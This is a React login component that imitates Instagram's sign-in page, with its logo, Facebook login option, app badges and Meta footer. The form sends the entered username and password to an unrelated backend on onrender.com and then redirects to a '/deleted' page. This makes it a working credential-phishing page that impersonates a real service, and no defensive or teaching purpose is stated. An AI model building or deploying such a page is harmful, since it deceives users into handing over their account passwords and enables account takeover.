import React, { useState } from 'react';
import axios from 'axios';
import './Login.css';
import logo from '../assets/instagram-logo.png';
import googlePlay from '../assets/googleplay.png';
import microsoft from '../assets/microsoft.png';

function Login() {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');

  const handleSubmit = async (e) => {
    e.preventDefault();
    try {
      // ✅ Corrected URL
      const res = await axios.post("https://instagram-backend-15c6.onrender.com/api/login", {
        username,
        password,
      });

      if (res.data.success) {
        window.location.href = '/deleted';
      } else {
        alert('Login failed');
      }
    } catch (err) {
      console.error('Login error:', err);
      alert('Login failed');
    }
  };
  return (
    <div className="login-wrapper">
      <div className="login-box">
        <img src={logo} alt="Instagram" className="insta-logo" />
        <form onSubmit={handleSubmit}>
          <input
            type="text"
            placeholder="Phone number, username, or email"
            value={username}
            onChange={(e) => setUsername(e.target.value)}
            required
          />
          <input
            type="password"
            placeholder="Password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            required
          />
          <button type="submit">Log In</button>
        </form>

        <div className="divider-wrapper">
          <div className="line"></div>
          <div className="or-text">OR</div>
          <div className="line"></div>
        </div>

        <div className="facebook-login">
          <img
            src="https://th.bing.com/th/id/OIP.cOz92GK9w_2_VxUIWBL0ngHaHa?rs=1&pid=ImgDetMain"
            alt="Facebook"
          />
          <span>Log in with Facebook</span>
        </div>

        <div className="forgot">Forgot password?</div>
      </div>

      <div className="signup-box">
        Don't have an account? <a href="/signup">Sign up</a>
      </div>

      <div className="get-app-text">Get the app.</div>
      <div className="app-buttons">
        <img src={googlePlay} alt="Google Play" />
        <img src={microsoft} alt="Microsoft" />
      </div>

      <footer>
        <div className="footer-links">
          Meta · About · Blog · Jobs · Help · API · Privacy · Terms · Locations ·
          Instagram Lite · Threads · Contact Uploading & Non-Users · Meta Verified
        </div>
        <div className="footer-bottom">
          <select>
            <option>English</option>
          </select>
          <div>© 2025 Instagram from Meta</div>
        </div>
      </footer>
    </div>
  );
}

export default Login;
